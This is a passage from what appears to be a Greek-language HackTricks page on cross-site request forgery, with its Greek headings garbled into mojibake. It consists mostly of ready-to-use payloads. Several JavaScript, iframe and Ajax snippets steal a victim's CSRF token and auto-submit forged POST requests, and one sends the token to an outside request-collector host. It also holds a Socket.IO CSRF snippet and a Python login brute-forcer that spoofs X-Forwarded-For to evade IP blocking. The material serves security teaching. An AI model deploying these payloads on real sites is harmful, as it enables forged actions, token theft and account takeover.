// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **ÎšÎ»Î­ÏˆÎµ Ï„Î¿ CSRF Token ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Îµ Î­Î½Î± Post Î±Î¯Ï„Î·Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± iframe, Î¼Î¹Î± Ï†ÏŒÏÎ¼Î± ÎºÎ±Î¹ Ajax**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **ÎšÎ»Î­ÏˆÎµ Ï„Î¿ CSRF Token ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Îµ Î­Î½Î± POST Î±Î¯Ï„Î·Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± iframe ÎºÎ±Î¹ Î¼Î¹Î± Ï†ÏŒÏÎ¼Î±**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **ÎšÎ»Î­ÏˆÎµ Ï„Î¿ token ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Îµ Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ 2 iframes**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTÎšÎ»Î­ÏˆÎµ Ï„Î¿ CSRF token Î¼Îµ Ajax ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Îµ Î¼Î¹Î± Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ Î¼Î¹Î± Ï†ÏŒÏÎ¼Î±**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF Î¼Îµ Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Login Brute Force

ÎŸ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÎµÎ¸ÎµÎ¯ ÏƒÎµ Î¼Î¹Î± Ï†ÏŒÏÎ¼Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± CSRF token (Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± X-Forwarded-For Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Î¼Î¹Î± Ï€Î¹Î¸Î±Î½Î® Î¼Î±ÏÏÎ· Î»Î¯ÏƒÏ„Î± IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Î•ÏÎ³Î±Î»ÎµÎ¯Î± <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÏ„Îµ Î¼Îµ Î­Î¼Ï€ÎµÎ¹ÏÎ¿Ï…Ï‚ Ï‡Î¬ÎºÎµÏ ÎºÎ±Î¹ ÎºÏ…Î½Î·Î³Î¿ÏÏ‚ bug bounty!

**Î•Î½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚ Î§Î¬ÎºÎ¹Î½Î³Îº**\
Î‘ÏƒÏ‡Î¿Î»Î·Î¸ÎµÎ¯Ï„Îµ Î¼Îµ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï€Î¿Ï… ÎµÎ¾ÎµÏÎµÏ…Î½Î¬ Ï„Î· ÏƒÏ…Î³ÎºÎ¯Î½Î·ÏƒÎ· ÎºÎ±Î¹ Ï„Î¹Ï‚ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… hacking

**Î•Î¹Î´Î®ÏƒÎµÎ¹Ï‚ Î§Î¬ÎºÎ¹Î½Î³Îº ÏƒÎµ Î ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Î§ÏÏŒÎ½Î¿**\
ÎœÎµÎ¯Î½ÎµÏ„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î¿Î¹ Î¼Îµ Ï„Î¿Î½ Ï„Î±Ï‡ÏÏ„Î±Ï„Î¿ ÎºÏŒÏƒÎ¼Î¿ Ï„Î¿Ï… hacking Î¼Î­ÏƒÏ‰ ÎµÎ¹Î´Î®ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ ÏƒÎµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Ï‡ÏÏŒÎ½Î¿

**Î¤ÎµÎ»ÎµÏ…Ï„Î±Î¯ÎµÏ‚ Î‘Î½Î±ÎºÎ¿Î¹Î½ÏÏƒÎµÎ¹Ï‚**\
ÎœÎµÎ¯Î½ÎµÏ„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î¿Î¹ Î¼Îµ Ï„Î¹Ï‚ Ï€Î¹Î¿ Ï€ÏÏŒÏƒÏ†Î±Ï„ÎµÏ‚ ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹Ï‚ bug bounty ÎºÎ±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±Ï‚

**Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ Î¼Î±Î¶Î¯ Î¼Î±Ï‚ ÏƒÏ„Î¿** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ÎºÎ±Î¹ Î¾ÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Î½Î± ÏƒÏ…Î½ÎµÏÎ³Î¬Î¶ÎµÏƒÏ„Îµ Î¼Îµ ÎºÎ¿ÏÏ…Ï†Î±Î¯Î¿Ï…Ï‚ Ï‡Î¬ÎºÎµÏ ÏƒÎ®Î¼ÎµÏÎ±!

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
